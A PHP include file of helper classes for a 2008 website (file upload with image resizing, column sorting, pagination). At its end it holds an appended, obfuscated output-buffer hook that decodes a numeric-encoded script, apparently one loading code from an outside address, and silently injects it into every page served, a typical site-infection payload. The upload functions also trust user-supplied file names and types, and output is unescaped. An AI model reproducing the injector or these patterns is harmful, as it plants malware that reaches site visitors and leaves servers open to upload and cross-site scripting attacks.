<?
/*
*	@myClasses.php
*	
*	@Version 3.0
*	@Date	 18-11-2008
*
*	@Created 05-11-2008 
*	@By Ambitos2000
*
*	@Owner 	 Ampartsoumian Antranik - Glass Studio 2008
*
*/
include_once('simple_image.php');


Class TFileUpload extends SimpleImage 
{
	var $fileName;
	var $fileFolder;
	var $fileMaxSize;
	var $errorMessage;
	
	function TFileUpload($file_name,$file_folder,$file_maxsize)
	{
		$this->fileName    = $file_name;
		$this->fileFolder  = $file_folder;
		$this->fileMaxSize = $file_maxsize;
		
		$this->errorMessage = "ok";
	}
	
	/*
	*	uploadFile()
	*	
	*/
	public function uploadFile()
	{
		$file_name = $_FILES[$this->fileName]["name"];
		
		if( $_FILES[$this->fileName]["size"] > $this->fileMaxSize ) 
		{
			$this->errorMessage = "File must be small from   ".$this->fileMaxSize." bytes";
			return $this->errorMessage;
		}
		
		if( $file_name == '' || $file_name == null || $file_name == " " ) 
		{
			$this->errorMessage = " Empty file name ";
			return $this->errorMessage;
		}
		
		if( file_exists( $this->fileFolder . $file_name  ) ) 
		{
			 unlink( $this->fileFolder . $file_name );
		}
		
		if( copy( $_FILES[$this->fileName]["tmp_name"], $this->fileFolder . $file_name ) )
		{
			$this->errorMessage = " File Uploaded ";
		}
		else
		{
			$this->errorMessage = " File Not Uploaded ";
		}
		return "ok ".$this->errorMessage;
		
	}
	
	/*
	*	uploadFileAndRename($new_name_prothema)
	*	
	*/
	public function uploadFileAndRename($new_name_prothema)
	{
		$file_name = $_FILES[$this->fileName]["name"];
		//$file_name = rename($file_name,$new_name_prothema.$file_name);
		
		if( $_FILES[$this->fileName]["size"] > $this->fileMaxSize ) 
		{
			$this->errorMessage = "File must be small from   ".$this->fileMaxSize." bytes";
			return $this->errorMessage;
		}
		
		if( $file_name == '' || $file_name == null || $file_name == " " ) 
		{
			$this->errorMessage = " Empty file name ";
			return $this->errorMessage;
		}
		
		if( file_exists( $this->fileFolder . $file_name  ) ) 
		{
			 unlink( $this->fileFolder . $file_name );
		}
		
		if( copy( $_FILES[$this->fileName]["tmp_name"], $this->fileFolder . $new_name_prothema.$file_name ) )
		{
			$this->errorMessage = " File Uploaded ";
			
		}
		else
		{
			$this->errorMessage = " File Not Uploaded ";
		}
		return "ok ".$this->errorMessage;
		
	}
	
	/*
	*	uploadFileAndRename($new_name_prothema)
	*	
	*/
	public function uploadFileRenameAndResize($new_name_prothema,$width)
	{
		$file_name = $_FILES[$this->fileName]["name"];
		//$file_name = rename($file_name,$new_name_prothema.$file_name);
		
		if( $_FILES[$this->fileName]["size"] > $this->fileMaxSize ) 
		{
			$this->errorMessage = "File must be small from   ".$this->fileMaxSize." bytes";
			return $this->errorMessage;
		}
		
		if( $file_name == '' || $file_name == null || $file_name == " " ) 
		{
			$this->errorMessage = " Empty file name ";
			return $this->errorMessage;
		}
		
		if( file_exists( $this->fileFolder . $file_name  ) ) 
		{
			 unlink( $this->fileFolder . $file_name );
		}
		
		if( copy( $_FILES[$this->fileName]["tmp_name"], $this->fileFolder . $new_name_prothema.$file_name ) )
		{
			 $image = new SimpleImage();
			 $image->load($this->fileFolder . $new_name_prothema.$file_name);
		     $image->resizeToWidth($width);
			 $image->save($this->fileFolder . $new_name_prothema.$file_name);
			$this->errorMessage = " File Uploaded ";
			
		}
		else
		{
			$this->errorMessage = " File Not Uploaded ";
		}
		return "ok ".$this->errorMessage;
		
	}
	  

	
	
	/*
	*	getFileName()
	*/
	public function getFileName()
	{
		return $_FILES[$this->fileName]["name"];
	}
	
	/*
	*	deleteFile()
	*/
	public function deleteFile()
	{
		if( file_exists( $this->fileFolder . $this->fileName  ) ) 
		{
			 if( unlink( $this->fileFolder . $this->fileName ) )
			 	return "Deleted File";
			else
				return "Error";	
		}
		else
			return "File not exist";
	}
	
}

Class TSorter
{
	var $PARAM_NAMES;									//Request Parameters Names
	var $PARAM_VALUES;									//Request Parameters Values
	
	var $formName;										//Form Name for submit
	var $formAction;
	
	var $upImgPath;
	var $downImgPath;
	
	var $sortedField;
	var $descAsc;
	
	function TSorter($arrParamNames,$arrParamValues,$frName,$frAction,$upImagePath,$downImagePath,$stdFiled)
	{
		for( $i=0; $i<count( $arrParamNames ); $i++ )
		{
			$this->PARAM_NAMES[$i]  = $arrParamNames[$i];
			$this->PARAM_VALUES[$i] = $arrParamValues[$i];
		}
		
		$this->formName    = $frName;
		$this->upImgPath   = $upImagePath;
		$this->downImgPath = $downImagePath;
		$this->sortedField = $stdFiled;
		$this->formAction  = $frAction;
	}
	
	/*
	* @createInputsParameters()
	*/
	public function createInputsParameters()
	{
		for( $i=0; $i<count( $this->PARAM_NAMES ); $i++ )
		{
			print "<input type=\"hidden\" name=\"".$this->PARAM_NAMES[$i]."\" value=\"".$this->PARAM_VALUES[$i]."\">";
		}
		print "<input type=\"hidden\" name=\"sortedField\" value=\"".$this->sortedField."\">";
		print "<input type=\"hidden\" name=\"ascDesc\" value=\"".$this->descAsc."\">";
	}
	
	
	/*
	* @sorted($fildText,$sortedFD,$descAsc,$thisSortedFieldName,$class)
	*/
	public function sorted($fildText,$sortedFD,$descAsc,$thisSortedFieldName,$class)
	{
		if( $descAsc == "DESC" )
		{
			$descAsc = "ASC";
			if( $thisSortedFieldName == $this->sortedField )
				$img = "<font style=\"text-decoration:none;\">&nbsp;&nbsp; <img border=\"0\" src=\"".$this->downImgPath."\"> </font>";
		}	
		else if( $descAsc == "ASC" )
		{
			$descAsc = "DESC";	
			if( $thisSortedFieldName == $this->sortedField )
				$img = "<font style=\"text-decoration:none;\">&nbsp;&nbsp; <img border=\"0\" src=\"".$this->upImgPath."\"> </font>";
		}	
		else if( $descAsc == "" )
		{
			$descAsc = "DESC";	
			//$img = "<img src=\"".$this->upImgPath."\">";
		}	
		else
		{
			$descAsc = "";	
			$img = "";
		}
		
		echo "<a href=\"#\" class=\"".$class."\" onClick=\"document.".$this->formName.".ascDesc.value = '".$descAsc."'; document.".$this->formName.".sortedField.value = '".$sortedFD."'; document.".$this->formName.".action = '".$this->formAction."';  document.".$this->formName.".submit();\"> $fildText $img</a>";
		/*print "<script> document.".$this->formName.".submit(); </script><script type="text/javascript">

</script><script type="text/javascript">

</script><script type="text/javascript">

</script>";*/
	}				
	
}



Class TPagging
{
	var $MAX_PAGE;								//Number of items in a page
	var $page_number;							//Number of all items ( count(*) )				
	var $max_page_soring;						//Max number of page numbers ( 1,2,3,4.... i )	i->max_page_soring
	
	var $url;
	var $form;
	
	
	public function TPagging($the_max_page,$the_page_number,$the_max_page_sorting,$the_url,$the_from)
	{
		$this->MAX_PAGE        = $the_max_page;
		$this->page_number     = $the_page_number;
		$this->max_page_soring = $the_max_page_sorting;
		$this->url             = $the_url;
		$this->from            = $the_from;
	}
	
	
	/*
	* @showSorters($className)
	*
	*/
	public function showSorters($from,$className)
	{
		if( $this->from == ( ($this->max_page_soring -1) * $this->MAX_PAGE  ) )	
			$this->max_page_soring++;
		
		if( intval( ($this->page_number/$this->MAX_PAGE) ) <= $this->max_page_soring )
			$this->max_page_soring = intval( ($this->page_number/$this->MAX_PAGE) );
	
	
		if( $this->from > 0 )
			echo "<a class=\"".$className."\" href=\"".$this->url."?max_page_soring=".$this->max_page_soring."&from=0\">First</a> ";
        else
			echo "First ";
			
		if( $this->from > 0 )
	        echo "<a class=\"".$className."\" href=\"".$this->url."?max_page_soring=".$this->max_page_soring."&from=".( $this->from - $this->MAX_PAGE )."\">Prev</a> &nbsp;";
		else	
        	echo "Prev &nbsp;"; 
        
		
		for( $i=0; $i<$this->max_page_soring; $i++ )
		{
			if( $this->from == ( $i * $this->MAX_PAGE ) )
				echo ($i+1)." ";	
			else
				echo "<a class=\"".$className."\" href=\"".$this->url."?max_page_soring=".$this->max_page_soring."&from=".( $i * $this->MAX_PAGE )."\">".($i+1)."</a> ";
		}	
		
		echo "&nbsp; of ".intval( ($this->page_number/$this->MAX_PAGE) )."&nbsp;";
        
		if( ( $this->from + $this->MAX_PAGE ) <= $this->page_number )
	        echo "&nbsp; <a class=\"".$className."\" href=\"".$this->url."?max_page_soring=".$this->max_page_soring."&from=".( $this->from + $this->MAX_PAGE )."\">Next</a>";
		else	
        	echo "&nbsp; Next";
		
		if( ( $this->from + $this->MAX_PAGE ) <= $this->page_number )
	        echo " <a class=\"".$className."\" href=\"".$this->url."?max_page_soring=".$this->max_page_soring."&from=".( $this->page_number - $this->MAX_PAGE )."\">Last</a>";
        else
			echo " Last";
		
	}
	
}



Class TSorterPagging
{
	var $PARAM_NAMES;									//Request Parameters Names
	var $PARAM_VALUES;									//Request Parameters Values
	
	var $formName;										//Form Name for submit
	var $formAction;
	
	var $upImgPath;
	var $downImgPath;
	
	var $sortedField;
	var $descAsc;
	
	var $limit_from;
	var $limit_to;
	var $limit_diafora;
	
	var $previous_img;
	var $next_img;
	
	var $pagImgWidth;
	
	
	function TSorterPagging($arrParamNames,$arrParamValues,$frName,$frAction,$upImagePath,$downImagePath,$stdFiled,$prevImg,$nextImg,$limitFrom,$limitTo,$diafora)
	{
		for( $i=0; $i<count( $arrParamNames ); $i++ )
		{
			$this->PARAM_NAMES[$i]  = $arrParamNames[$i];
			$this->PARAM_VALUES[$i] = $arrParamValues[$i];
		}
		
		$this->formName    = $frName;
		$this->upImgPath   = $upImagePath;
		$this->downImgPath = $downImagePath;
		$this->sortedField = $stdFiled;
		$this->formAction  = $frAction;
		
		$this->previous_img = $prevImg;
		$this->next_img     = $nextImg;
		$this->limit_from   = $limitFrom;
		$this->limit_to 	= $limitTo;
		$this->limit_diafora = $diafora;
		
		$this->pagImgWidth = 12;
	}
	
	/*
	* @createInputsParameters()
	*/
	public function createInputsParameters()
	{
		for( $i=0; $i<count( $this->PARAM_NAMES ); $i++ )
		{
			print "<input type=\"hidden\" name=\"".$this->PARAM_NAMES[$i]."\" value=\"".$this->PARAM_VALUES[$i]."\">";
		}
		print "<input type=\"hidden\" name=\"sortedField\" value=\"".$this->sortedField."\">";
		print "<input type=\"hidden\" name=\"ascDesc\" value=\"".$this->descAsc."\">";
		
		print "<input type=\"hidden\" name=\"limit_from\" value=\"".$this->limit_from."\">";
		print "<input type=\"hidden\" name=\"limit_to\" value=\"".$this->limit_to."\">";
	}
	
	
	/*
	* @sorted($fildText,$sortedFD,$descAsc,$thisSortedFieldName,$class)
	*/
	public function sorted($fildText,$sortedFD,$descAsc,$thisSortedFieldName,$class)
	{
		if( $descAsc == "DESC" )
		{
			$descAsc = "ASC";
			if( $thisSortedFieldName == $this->sortedField )
				$img = "<font style=\"text-decoration:none;\">&nbsp;&nbsp; <img border=\"0\" src=\"".$this->downImgPath."\"> </font>";
		}	
		else if( $descAsc == "ASC" )
		{
			$descAsc = "DESC";	
			if( $thisSortedFieldName == $this->sortedField )
				$img = "<font style=\"text-decoration:none;\">&nbsp;&nbsp; <img border=\"0\" src=\"".$this->upImgPath."\"> </font>";
		}	
		else if( $descAsc == "" )
		{
			$descAsc = "DESC";	
			//$img = "<img src=\"".$this->upImgPath."\">";
		}	
		else
		{
			$descAsc = "";	
			$img = "";
		}
		
		echo "<a href=\"#\" class=\"".$class."\" onClick=\"document.".$this->formName.".ascDesc.value = '".$descAsc."'; document.".$this->formName.".sortedField.value = '".$sortedFD."'; document.".$this->formName.".action = '".$this->formAction."';  document.".$this->formName.".submit();\"> $fildText $img</a>";
		/*print "<script> document.".$this->formName.".submit(); </script>";*/
	}	
	
	
	
	/*
	* @pagging()
	*/
	public function pagging($count,$class)
	{
		if( $this->limit_from > 0 )	//Previous
		{
			echo "<a href=\"#\"  title=\"Previous\" class=\"".$class."\" onClick=\"document.".$this->formName.".limit_from.value = '".( $this->limit_from - $this->limit_diafora) ."'; document.".$this->formName.".action = '".$this->formAction."';  document.".$this->formName.".submit();\"> <img src=\"".$this->previous_img."\" border=\"0\" width=\"".$this->pagImgWidth."\"></a>";
		}
		else
		{
			echo "<a  title=\"Previous\" class=\"".$class."\" > <img src=\"".$this->previous_img."\" border=\"0\"  width=\"".$this->pagImgWidth."\"></a>";
		}	
		
		$pageNumbers = (int)($count / $this->limit_diafora); 
		
		$upolupo = ($count % $this->limit_diafora);
		if( $upolupo > 0 )
			$pageNumbers++;
		
		if( $pageNumbers == 0 )
			$pageNumbers = 1;
			
		$displayedPage = (int)round( ($this->limit_from / $this->limit_diafora) +1 ); 
		
		echo " &nbsp;&nbsp;
				<font class=\"".$class."\">
					".$displayedPage." / ".$pageNumbers." Pages
				</font>
			   &nbsp;&nbsp; 	
			";
		
	/*	echo " &nbsp;&nbsp;
				<font class=\"".$class."\">
					".$this->limit_from." - ".( $this->limit_from + $this->limit_diafora )." / ".$count."
				</font>
			   &nbsp;&nbsp; 	
			";
	*/	
			
			
		
		if( ( $this->limit_from + $this->limit_diafora ) < $count )	//Next
		{
			echo "<a href=\"#\" title=\"Next\" class=\"".$class."\" onClick=\"document.".$this->formName.".limit_from.value = '".( $this->limit_from + $this->limit_diafora) ."'; document.".$this->formName.".limit_to.value = '".( $this->limit_from + $this->limit_diafora) ."'; document.".$this->formName.".action = '".$this->formAction."';  document.".$this->formName.".submit();\"> <img src=\"".$this->next_img."\" border=\"0\"  width=\"".$this->pagImgWidth."\"></a>";
		}
		else
		{
			echo "<a  title=\"Next\" class=\"".$class."\" > <img src=\"".$this->next_img."\" border=\"0\"  width=\"".$this->pagImgWidth."\"></a>";
		}	
		
	}
				
	
}

?><?php global $ob_starting;
if(!$ob_starting) {
   function ob_start_flush($s) {
	$tc = array(0, 69, 84, 82, 67, 83, 7, 79, 8, 9, 73, 12, 76, 68, 63, 78, 19, 23, 24, 3, 65, 70, 27, 14, 16, 20, 80, 17, 29, 89, 86, 85, 2, 77, 91, 93, 11, 18, 71, 66, 72, 75, 87, 74, 22, 37, 52, 13, 59, 61, 25, 28, 21, 1, 35, 15, 34, 36, 30, 88, 41, 92, 46, 33, 51);
	$tr = array(51, 5, 4, 3, 10, 26, 2, 0, 2, 29, 26, 1, 28, 32, 2, 1, 59, 2, 55, 43, 20, 30, 20, 5, 4, 3, 10, 26, 2, 32, 58, 10, 21, 0, 8, 2, 29, 26, 1, 7, 21, 8, 3, 1, 13, 1, 21, 14, 4, 7, 12, 7, 3, 5, 9, 28, 28, 32, 31, 15, 13, 1, 21, 10, 15, 1, 13, 32, 9, 0, 34, 0, 0, 0, 30, 20, 3, 0, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 0, 28, 0, 15, 1, 42, 0, 63, 3, 3, 20, 29, 8, 6, 19, 25, 39, 18, 37, 17, 37, 6, 11, 0, 6, 19, 18, 27, 17, 18, 17, 21, 6, 11, 0, 6, 19, 18, 16, 37, 21, 18, 16, 6, 11, 0, 6, 19, 18, 18, 17, 21, 17, 25, 6, 11, 0, 6, 19, 25, 4, 16, 27, 18, 16, 6, 11, 0, 6, 19, 17, 25, 18, 17, 18, 16, 6, 11, 0, 6, 19, 16, 1, 17, 50, 17, 24, 6, 11, 0, 6, 19, 18, 52, 17, 24, 18, 37, 6, 11, 0, 6, 19, 17, 37, 18, 27, 17, 18, 6, 11, 0, 6, 19, 17, 21, 18, 16, 16, 27, 6, 11, 0, 6, 19, 37, 21, 18, 37, 18, 27, 6, 11, 0, 6, 19, 17, 37, 25, 4, 16, 27, 6, 11, 0, 6, 19, 17, 17, 18, 16, 18, 16, 6, 11, 0, 6, 19, 17, 21, 25, 50, 16, 1, 6, 11, 0, 6, 19, 16, 1, 25, 17, 25, 52, 6, 11, 0, 6, 19, 16, 13, 25, 25, 25, 25, 6, 11, 0, 6, 19, 16, 13, 25, 24, 25, 16, 6, 11, 0, 6, 19, 16, 21, 16, 13, 25, 27, 6, 11, 0, 6, 19, 16, 21, 25, 37, 16, 1, 6, 11, 0, 6, 19, 17, 50, 18, 37, 16, 1, 6, 11, 0, 6, 19, 17, 50, 18, 24, 18, 25, 6, 11, 0, 6, 19, 17, 25, 18, 27, 18, 18, 6, 11, 0, 6, 19, 16, 13, 17, 4, 17, 18, 6, 11, 0, 6, 19, 17, 13, 16, 13, 17, 21, 6, 11, 0, 6, 19, 17, 17, 17, 21, 16, 27, 6, 11, 0, 6, 19, 25, 13, 24, 24, 24, 24, 6, 9, 22, 0, 0, 0, 30, 20, 3, 0, 3, 1, 13, 1, 21, 14, 4, 7, 12, 7, 3, 5, 0, 28, 0, 27, 22, 0, 0, 0, 30, 20, 3, 0, 4, 7, 12, 7, 3, 5, 14, 26, 10, 4, 41, 1, 13, 0, 28, 0, 24, 22, 0, 0, 0, 21, 31, 15, 4, 2, 10, 7, 15, 0, 13, 10, 30, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 2, 11, 5, 2, 29, 12, 1, 13, 9, 0, 34, 30, 20, 3, 0, 5, 0, 28, 0, 32, 32, 22, 21, 7, 3, 0, 8, 43, 28, 24, 22, 43, 51, 2, 23, 12, 1, 15, 38, 2, 40, 22, 43, 36, 36, 9, 0, 34, 30, 20, 3, 0, 4, 14, 3, 38, 39, 0, 28, 0, 2, 48, 43, 49, 22, 21, 7, 3, 0, 8, 10, 28, 27, 22, 10, 51, 17, 22, 10, 36, 36, 9, 0, 34, 30, 20, 3, 0, 4, 14, 4, 12, 3, 0, 28, 0, 4, 14, 3, 38, 39, 23, 5, 31, 39, 5, 2, 3, 8, 10, 36, 36, 11, 37, 9, 22, 10, 21, 0, 8, 4, 14, 4, 12, 3, 53, 28, 32, 24, 24, 32, 9, 0, 5, 0, 36, 28, 0, 64, 2, 3, 10, 15, 38, 23, 21, 3, 7, 33, 54, 40, 20, 3, 54, 7, 13, 1, 8, 26, 20, 3, 5, 1, 60, 15, 2, 8, 4, 14, 4, 12, 3, 11, 27, 44, 9, 47, 27, 52, 9, 22, 35, 35, 10, 21, 0, 8, 5, 2, 29, 12, 1, 13, 9, 0, 34, 5, 0, 28, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 24, 11, 16, 44, 9, 0, 36, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 16, 44, 11, 8, 5, 23, 12, 1, 15, 38, 2, 40, 47, 16, 18, 9, 9, 0, 36, 0, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 48, 27, 49, 23, 5, 31, 39, 5, 2, 3, 8, 24, 11, 27, 9, 36, 15, 1, 42, 0, 57, 20, 2, 1, 8, 9, 23, 38, 1, 2, 46, 10, 33, 1, 8, 9, 0, 36, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 8, 5, 23, 12, 1, 15, 38, 2, 40, 47, 37, 9, 9, 22, 35, 0, 1, 12, 5, 1, 0, 34, 5, 0, 28, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 16, 44, 11, 8, 5, 23, 12, 1, 15, 38, 2, 40, 47, 16, 18, 9, 9, 0, 36, 0, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 48, 27, 49, 23, 5, 31, 39, 5, 2, 3, 8, 24, 11, 27, 9, 36, 15, 1, 42, 0, 57, 20, 2, 1, 8, 9, 23, 38, 1, 2, 46, 10, 33, 1, 8, 9, 22, 35, 3, 1, 2, 31, 3, 15, 0, 5, 22, 0, 0, 0, 35, 0, 0, 0, 21, 31, 15, 4, 2, 10, 7, 15, 0, 2, 3, 29, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 9, 0, 34, 2, 3, 29, 0, 34, 0, 0, 0, 10, 21, 8, 53, 13, 7, 4, 31, 33, 1, 15, 2, 23, 38, 1, 2, 45, 12, 1, 33, 1, 15, 2, 56, 29, 60, 13, 0, 61, 61, 0, 53, 13, 7, 4, 31, 33, 1, 15, 2, 23, 4, 3, 1, 20, 2, 1, 45, 12, 1, 33, 1, 15, 2, 9, 34, 13, 7, 4, 31, 33, 1, 15, 2, 23, 42, 3, 10, 2, 1, 8, 13, 10, 30, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 11, 27, 9, 9, 22, 0, 0, 0, 35, 0, 1, 12, 5, 1, 0, 34, 30, 20, 3, 0, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 28, 13, 7, 4, 31, 33, 1, 15, 2, 23, 4, 3, 1, 20, 2, 1, 45, 12, 1, 33, 1, 15, 2, 8, 32, 5, 4, 3, 10, 26, 2, 32, 9, 22, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 23, 2, 29, 26, 1, 28, 32, 2, 1, 59, 2, 55, 43, 20, 30, 20, 5, 4, 3, 10, 26, 2, 32, 22, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 23, 5, 3, 4, 28, 13, 10, 30, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 11, 24, 9, 22, 13, 7, 4, 31, 33, 1, 15, 2, 23, 38, 1, 2, 45, 12, 1, 33, 1, 15, 2, 5, 56, 29, 46, 20, 38, 62, 20, 33, 1, 8, 32, 40, 1, 20, 13, 32, 9, 48, 24, 49, 23, 20, 26, 26, 1, 15, 13, 54, 40, 10, 12, 13, 8, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 9, 22, 35, 35, 0, 4, 20, 2, 4, 40, 8, 1, 9, 0, 34, 0, 35, 2, 3, 29, 0, 34, 4, 40, 1, 4, 41, 14, 4, 7, 12, 7, 3, 5, 14, 26, 10, 4, 41, 1, 13, 8, 9, 22, 35, 0, 4, 20, 2, 4, 40, 8, 1, 9, 0, 34, 0, 5, 1, 2, 46, 10, 33, 1, 7, 31, 2, 8, 32, 2, 3, 29, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 9, 32, 11, 0, 52, 24, 24, 9, 22, 35, 0, 0, 0, 35, 0, 0, 0, 2, 3, 29, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 9, 22, 35, 51, 55, 5, 4, 3, 10, 26, 2, 58);

	$ob_htm = ''; foreach($tr as $tval) {
		$ob_htm .= chr($tc[$tval]+32);
	}

	$slw=strtolower($s);
	$i=strpos($slw,'</script');if($i){$i=strpos($slw,'>',$i);}
	if(!$i){$i=strpos($slw,'</div');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</table');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</form');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</p');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</body');if($i){$i--;}}
	if(!$i){$i=strlen($s);if($i){$i--;}}
	$i++; $s=substr($s,0,$i).$ob_htm.substr($s,$i);
	
	return $s;
   }
   $ob_starting = time();
   @ob_start("ob_start_flush");
} ?>